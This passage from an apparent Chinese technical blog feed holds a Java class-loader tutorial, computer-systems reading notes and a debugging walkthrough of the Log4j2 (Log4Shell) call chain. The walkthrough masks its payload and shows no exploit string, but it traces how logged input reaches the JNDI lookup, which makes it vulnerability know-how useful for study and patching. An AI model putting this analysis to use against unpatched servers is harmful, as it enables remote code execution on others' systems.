class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>继续跟：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>继续：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ClassLoader</span><span class="params">(Void unused, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        <span class="keyword">if</span> (ParallelLoaders.isRegistered(<span class="built_in">this</span>.getClass())) &#123;</span><br><span class="line">            parallelLockMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">            package2certs = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">            assertionLock = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// no finer-grained lock; lock on the classloader instance</span></span><br><span class="line">            parallelLockMap = <span class="literal">null</span>;</span><br><span class="line">            package2certs = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">            assertionLock = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里看到this.parend 被赋值为传进来的形参parent，而这个参数值为null，所以扩展类加载器的父类为null。</p>
<p>当我们跟到findClass方法里面发现了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/244da1d4d3043573f856bec2aad525b0.png" alt="在这里插入图片描述"><br>直接抛出了异常，所以如果我们需要加载任意路径的类就需要重写findClass方法。<br>findClass方法中实现的功能就是从文件系统加载class文件到内存，然后通过defineClass方法生成一个Class对象，defineClass方法的逻辑在ClassLoader类中实现了。看下面的一个findClass的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在查找类@&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取类的字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] classData = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        classData = getClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//使用defineClass生成class对象</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>getClassData方法实现的是从文件系统加载字节码数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在获取字节数据&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> classNameToPath(className);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(s));</span><br><span class="line">            <span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);</span></span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>classNameToPath则是将输入的文件名转换为对应路径的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">classNameToPath</span><span class="params">(String classname)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rootDir + File.separatorChar + classname.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样一个findClass方法的简单逻辑就实现了。完整的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.javabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String rootDir;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FileClassLoader</span><span class="params">(String rootDir)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.rootDir = rootDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在查找类@&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取类的字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] classData = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        classData = getClassData(name);</span><br><span class="line">        <span class="keyword">if</span> (classData == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//使用defineClass生成class对象</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">classNameToPath</span><span class="params">(String classname)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rootDir + File.separatorChar + classname.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getClassData(String className) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;正在获取字节数据&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> classNameToPath(className);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(s));</span><br><span class="line">            <span class="comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);</span></span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rootDir</span> <span class="operator">=</span> <span class="string">&quot;E:\\desktop\\java\\javatest\\target\\classes&quot;</span>;</span><br><span class="line">        <span class="type">FileClassLoader</span> <span class="variable">fileClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileClassLoader</span>(rootDir);</span><br><span class="line"><span class="comment">//        fileClassLoader.getClassData(&quot;test&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;自定义类加载器的父加载器：&quot;</span>+fileClassLoader.getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器：&quot;</span>+ClassLoader.getSystemClassLoader());</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器的父加载器：&quot;</span>+ClassLoader.getSystemClassLoader().getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器的父加载器：&quot;</span>+ClassLoader.getSystemClassLoader().getParent().getParent());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = fileClassLoader.findClass(<span class="string">&quot;com.armandhe.javabase.ClassLoaderDemo&quot;</span>);</span><br><span class="line">            System.out.println(aClass.newInstance());</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;test&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;类未发现！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5b05384bf5cd30d49c453edd95c5db86.png" alt="在这里插入图片描述"><br>在上面我们我们提到了在loadClass方法中有一个参数var2，如果var2&#x3D;&#x3D;true则掉哦用了resolveClass方法，使用该方法可以使用类的Class对象创建完成也同时被解析。前面我们说链接阶段主要是对字节码进行验证，为类变量分配内存并设置初始值同时将字节码文件中的符号引用转换为直接引用。<br>还有个线程上下文加载器，写不动了！！！去看原文吧<br>jdbc就使用的线程上线文加载器，一般来说线程上下文加载器使用的是系统类加载器，但在某些中间件中其使用的是自定义的类加载器，如tomcat。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>类加载</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统读书笔记（一）</title>
    <url>/archives/84d33ff8.html</url>
    <content><![CDATA[<ul>
<li>一个程序从文件到执行要经过这些过程：<br>源程序经过预处理器将声明的头部文件导入到程序中生成一个文本文件一般以.i结尾，然后经过编译器编译成汇编程序，一般以.s结尾，然后经过汇编器翻译成机器指令生成可重定位目标程序，此程序是一个二进制文件，然后经过链接器链接程序中使用的链接库函数最终生成一个可执行目标文件，最终该可执行文件被加载到内存中由系统执行。</li>
<li>适配器一般是插在主板卡槽中的一块卡，控制器一般是集成在IO设备上的核心控制芯片</li>
<li></li>
<li>虚拟内存结构：最上层空间为操作系统内核内存，向下依次为用户栈、共享库映射区域、运行时堆、程序代码和数据。</li>
<li>多核超线程：多核-多个CPU内核，超线程，单个CPU内核中能同时执行多个控制流，在core i7中单核可以同时执行两个控制流，这也就解释了我的一个疑惑，当初在编译linux内核的是有执行make -j number 为什么number会是系统内核数量的2倍，原来根源在这儿，果然看书能更增加人的知识面。该功能是通过在单个内核中备份某些硬件来实现的，如备份程序计数器（PC）及寄存器文件。</li>
<li>指令级并行，现代处理器可以同时执行多条指令的属性称为指令级并行</li>
<li>时钟周期，完成一轮0、1切换花费的时间，上网查的，不一定准确。</li>
<li>超标量处理器：一个周期可以执行超过一条指令的处理器</li>
<li>操作系统内核是应用程序与硬件的媒介，它提供三个基本抽象，文件时对系统I&#x2F;O设备的抽象，虚拟内存是对主存和磁盘的抽象，进程是对处理器、主存、I&#x2F;O设备的抽象，虚拟机是对操作系统、处理器、主存和I&#x2F;O设备的抽象。</li>
<li>amdahl定律描述了对系统某一部分进行功能升级对整体性能的影响。其主要思想是在对系统的某个部分进行加速时，其对系统整体性能的影响取决于给部分的重要性与加速程度。如果系统原来的运行时间为T1，假设某部分所需的执行时间占系统运行时间的a，这部分性能提升了k倍，那么不难得出新系统的整体运行时间T2&#x3D;(1-a)T1+(aT1)&#x2F;k，加速时间比S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)。考虑极端的情况当k无限趋近于无穷大的时候S&#x3D;1&#x2F;(1-a)，系统整体的性能提升程度取决于该部分的重要程度，该结论通过简单的思考其实也并不难以得出。<br>-对于一个4字节表示的32为无符号整数来说，其在内存中的存储可采取大端法与小端法两种方式，大端法即字节高位在前，小端法即字节低位在前，比如此处有内存地址0x100 0x101 0x102 0x103，那么采用大端法对于整数0x01234567的存储顺序为01 23 45 67 对于小端法存储顺序为67 45 23 01，当然采用哪一种存储方式往往是没有什么影响的，但是当微处理器固定下来后，数据的存储方式也就被固定了，当然也存在有支持双端法的处理器，由用户来选择使用哪一种存储顺序，当然具体采用那种存储顺序还取决于操作系统支持的存储方式，例如andriod就只支持小端的存储顺序。</li>
</ul>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>深入理解计算机系统</tag>
      </tags>
  </entry>
  <entry>
    <title>深入剖析Log4j2调用流程</title>
    <url>/archives/a60aa68e.html</url>
    <content><![CDATA[<p>@<a href="%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90Log4j2%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B">TOC</a></p>
<blockquote>
<p><b><font color="red">申明：</font></b>本文只做学习交流使用，严禁任何组织和个人通过转发、转载等方式进行传播，因此导致的法律后果与本文作者无关。</p>
</blockquote>
<p>小菜鸡昨晚正在积极进补雷神大大的课程的时候：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7a29e750df12950a939abb3ac4b60a21.png" alt="在这里插入图片描述"><br>老板的消息划破了寂静的夜空，也打断了我学习的脚步：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/512baf9e23209af67cd6f42175fa1b99.png" alt="在这里插入图片描述"><br>按照我的尿性，这种时候我肯定偷偷装死没跑了。<br>不过这个漏洞还是引起了我的兴趣，毕竟热度就那么多，蹭一蹭就没有了，我肯定也要蹭一蹭了。于是在昨晚瞎整了一晚上没结果后，今天上班的时候划水就把这整个利用过程给跑通了…..<br>果然上班划水才是生产力啊。</p>
<span id="more"></span>
<p>首先，我们使用maven进行项目管理，搭建漏洞环境：<br>在pom.xml中引入下面的两个依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>漏洞存在的版本就懒得说了，反正不是最新版就对了，手动狗头！！<br>然后写个小页面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.log4j2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span>  LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;payload手动打码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后打断点直接开始调试：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/92ef54f1b81f34febe364524cf063e15.png" alt="在这里插入图片描述"><br>跳进去，懂的都懂：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1679d2a2bc9c9de40ecf28d36a1070cc.png" alt="在这里插入图片描述"><br>到了这儿后据说是一个非常重要的步骤，调用<code>logIfEnabled</code>方法判断是否启用日志记录，这里的日志记录分为不同的等级，可以在log4j2的配置文件log4j2.properties中进行配置日志记录的级别。<br>我们继续跟进该方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/729130e9fa14957c6e2b815d1b31c7c6.png" alt="在这里插入图片描述"><br>虽然不知道<code>logMessage</code>函数干什么的，不过肯定不是我们需要的，继续跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f31c2dfe441cc6dfb5b1e9c32bdb7a1a.png" alt="在这里插入图片描述"><br><code>logMessageSafely</code>函数，翻译一下就是日志信息安全性，猜一下可能是进行安全性判断的吧？因为是从零开始的期间我还跟进了newMessage函数，发现是将我们的message封装成了一个对象，对我们的目标没有大的影响， 跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/55b52ab3475ace84ea0be5261d33948a.png" alt="在这里插入图片描述"><br>就想这样，将message封装进了一个<code>ReusableSimpleMessage</code>对象，继续回到<code>logMessageSafely</code>函数跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/02c3d13d06be439ccfff0bc1e451d194.png" alt="在这里插入图片描述"><br>跟进<code>logMessageTrackRecursion</code>函数，不懂就问recursion什么意思？所以我抽空去有道查了一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6cdb98d468bfff0259e7da92d31b8c95.png" alt="在这里插入图片描述"><br>函数名翻译过来就是日志信息跟踪递归，什么意思？俺也不知道，继续跟进：</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/701069406622e415d2b25b3c7798b2d3.png" alt="在这里插入图片描述"><br>哦豁，原来就在下面，跟进函数<code>tryLogMessage</code>，老规矩还是翻译一下，捕获日志信息，还是不知道什么意思，但是又有什么关系呢，继续跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/98636e80eb9cc3fce6b1e17cf058713a.png" alt="在这里插入图片描述"><br>管他什么呢，无脑继续跟：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/39d5b64d2dba6ca930f9611576bfc86d.png" alt="在这里插入图片描述"><br>又能怎么样呢，继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/60380af23a7bfce5738d606173e194ec.png" alt="在这里插入图片描述"><br>好烦啊，无限套娃：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b789a326b70d2fb87c02d77bf7556660.png" alt="在这里插入图片描述"><br>先进去看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c4facdffe086a4b185b4df31b00f32d9.png" alt="在这里插入图片描述"><br>好像做了很多，又好像什么也没做，就是setMessage哪儿换了个对象封装message：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c674c83442ac5e197f1d9db190fac1f.png" alt="在这里插入图片描述"><br>意义不大，所以我们继续单步执行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0369eb8151f77750a1d36fc269eb7747.png" alt="在这里插入图片描述"><br>到这儿后跟进<code>this.log</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/5af6633b2ea10974dae5f3fd0eb3a151.png" alt="在这里插入图片描述"><br>然后进入<code>processLogEvent</code>：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c817be2d6cc1bcaf4b9f3e216de576fa.png" alt="在这里插入图片描述"><br>到了这儿后，如果我们直接单步向下会发现处理发生了延迟，这就是我们的主机在请求dns解析产生的延迟，我也是在发现了这个特点之后才能在这又臭又长的调用链中坚持到最后，继续跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/00286cb7c1ef331c295df7fa35613128.png" alt="在这里插入图片描述"><br>这儿很关键啊，兄弟们，不信我们往下看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82528d1fa8e3932a8ba4b2543307a737.png" alt="在这里插入图片描述"><br>继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2a77c16aef24c107051f88dd1fd25798.png" alt="在这里插入图片描述"><br>这儿是挨着的两次调用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0d1cb474302bf5ec825c0722d332e4b5.png" alt="在这里插入图片描述"><br>继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0af7a6a5af6786246a7db5c3bc915d46.png" alt="在这里插入图片描述"><br>这儿三重套娃：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f85f1a45d1dbb0ca01e8cb7425fbc5c.png" alt="在这里插入图片描述"><br>二重套娃：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/acb65f312ca7767ba09307778fc8f515.png" alt="在这里插入图片描述"><br>刚才说错了兄弟们，前面不重要，这儿很重要啊，这儿有11重循环，当循环到第8层的时候会有惊喜，所以我们至今到第8次循环让你们见识见识什么他么的叫他么的惊喜：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a2dcf295b6dbcbcb38531c4b5ad0c9d9.png" alt="在这里插入图片描述"><br>好了看到i等于8了吗：<br>跟进去咯：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/22983898aa9728d1ef3af6c3adf236e2.png" alt="在这里插入图片描述"><br>继续咯，不用我教你吧：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b29b5f9fe7a9a8b2aaa875a07bff652e.png" alt="在这里插入图片描述"><br>亲，敲黑板划重点了啊！！！！！<br>这里有个进入的前提条件：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0369aa95ff29a7c9fe14bc8aa05010c0.png" alt="在这里插入图片描述"><br><code>this.config</code>不为空，且<code>this.noLookups</code>为<code>false</code>,这也是为什么你在各种各样的公众号看到的该漏洞的一个解决方案就是将<code>noLookups</code>的值设置为true的原因。</p>
<p><code>workingBuiler</code>是个啥？我也不知道啊，怎么可能，这玩意就是一个<code>stringBuilder</code>，所以你懂了吧？<br><img src="https://i-blog.csdnimg.cn/blog_migrate/52031b353660b11cecfe36d09ce1ee31.png" alt="在这里插入图片描述"><br>因为他娘的在这个声明过了，那么问题来了，长度80，也就是我的日志长度不能超过80？扯淡呢吧？当然超过80了，搞不懂搞不懂。<br>进入的条件判断有一个offset调试后发现是59，查了一下发现是$，也就是说message前面的58个字符的长度是固定的咯，我们输入的信息从第59个开始：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/95d37546a76a8458337d2d73f41c4196.png" alt="在这里插入图片描述"><br>然后判断连续两个字符是是否为<code>\$&#123;</code>,如果是进入正题，截取了从59到后面的所有字符赋值给<code>value</code>，然后给我们的<code>workingBuilder</code>设置了长度并将截取的value进行处理之后赋值给他，在这里我利用了前面说到的延时特性观察到命令执行就发生在这里的对value处理过程中，所以我们跟进这个处理过程：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/77e72d743f92e20ce96f1ff90ce87a50.png" alt="在这里插入图片描述"><br>source就是value的值，继续跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1bad77b2aceba1bb205a5a23c2bfab76.png" alt="在这里插入图片描述"><br>又开始套娃了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7102cb38abd72eb84a66f10353cf72dc.png" alt="在这里插入图片描述"><br>这个<code>substitute</code>函数可以说是写的又臭又长，总结一下左右就是提取那个啥？就那个我们的payload就对了，一直单步到这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/777e4b23c5e9cb4f1dbdb1f9a9c8fdd7.png" alt="在这里插入图片描述"><br>进去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/85de273e4cebfbfdbdaeff7c550bbc55.png" alt="在这里插入图片描述"><br>到这儿后其实<code>variableName</code>就是我们的payload主体了，继续：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/0313841f9f36678dd7e4d637817783b1.png" alt="在这里插入图片描述"><br>这里有两个重要的操作，一个是获得了协议前缀，一个是获取了具体的paload内容，<code>this.strLookupMap</code>里面定义了很多支持的协议，我们可以看一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/cd6baa92469583faac3fc24c6b7b5550.png" alt="在这里插入图片描述"><br>进入进入断点，判断event是否为空，肯定不为空啊，所以进入的是<code>lookup.lookup(name)</code>：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2457f1acef53a78931a280628fc472c8.png" alt="在这里插入图片描述"><br>到了这里就有意思而了，第一个红框是获取一个<code>JndiManager</code>，但是在我调试的时候这里面好像是报错了还是怎么了，总是进不到第二个红框里面，而执行命令的代码又恰好在第二个红框里面，你说奇怪不奇怪？<br>是有意我直接强行跟踪到了第二个红框里面的代码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99a6eb1527f821e09afa691c4f89d85d.png" alt="在这里插入图片描述"><br>重中之重就在这里了哈！！！lookup函数，看到这个你想到了什么？不确定吗？那来看看<code>this.context</code>是什么，<code>InitialContext</code>有没有想起点什么？？？？<br>打完收工！！！！！</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统读书笔记（二）</title>
    <url>/archives/b4c5d320.html</url>
    <content><![CDATA[<ul>
<li>数据的表示，无符号数一位就是一个数，有符号数采用补码的形式表示，最高位为负权，当最高位为1时其权重为-x(2**（w-1))，w为位数，x为最高位的取值。于是乎一个有符号数的补码表示就成了所有正权与负权之和。</li>
<li>一个整数能被二进制方式表示，其根源在于其编码方式的唯一性，即双射，解释就是一个数在编码后有唯一的一个二进制格式与之对应，而这个二进制排列顺序在转换为整数后也有且仅有一个数与之对应。就想数学里的反函数一样。</li>
<li>原码表示有符号数通过最高位作为符号位，如果最高位为1，则剩下的位取负权，如果最高位为0，则剩下的位取政权</li>
<li>反码表示有符号数，最高位的权重为-x.(2**(2-1)-1) x为最高位的取值</li>
<li>整数类型的强制类型转换，将一个无符号数转换为有符号数时二进制位的数据不变，变的只是解释这些位的方式。</li>
<li>一个规律：一个4位有符号数-1，其强转为无符号数之后为15，注意到1+15 &#x3D; 16 &#x3D; 2*<em>4。这样就能很方便得进行负数有符号数转为无符号数，当然正数两种表示方式的结果都一样，当然一切都建立在有符号数使用补码表示。其原理为，最高位权重，对于一个4位表示的整数， 当使用补码时，最高位为1时权重为-8，使用无符号数时其权重为8，两者之间差了2</em>***4 &#x3D; 16。</li>
<li>将无符号数转换为有符号数的时候，当无符号数小于等于有符号数的最大值的时候保持不变，当无符号数大于有符号数的最大值的时候，转换后的值为U-2**w，U为当前无符号数，w二进制位数。</li>
<li>无符号数的长度扩展是零扩展，即大端法表示在左侧填充0，对于有符号数则是符号填充，负数填充1，正数填充0</li>
<li>在将一个长度较小的有符号数变成无符号长度较大的数的时候，是先进行符号填充再进行符号转换的，如果顺序错了将产生完全不一样的结果。</li>
<li>当一个有符号数与无符号数进行运算时会发生隐式类型转换，项范围更广的值转换。这个过程是非直观的，往往会导致很多预料之外的结果。</li>
</ul>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>深入理解计算机系统</tag>
      </tags>
  </entry>
  <entry>
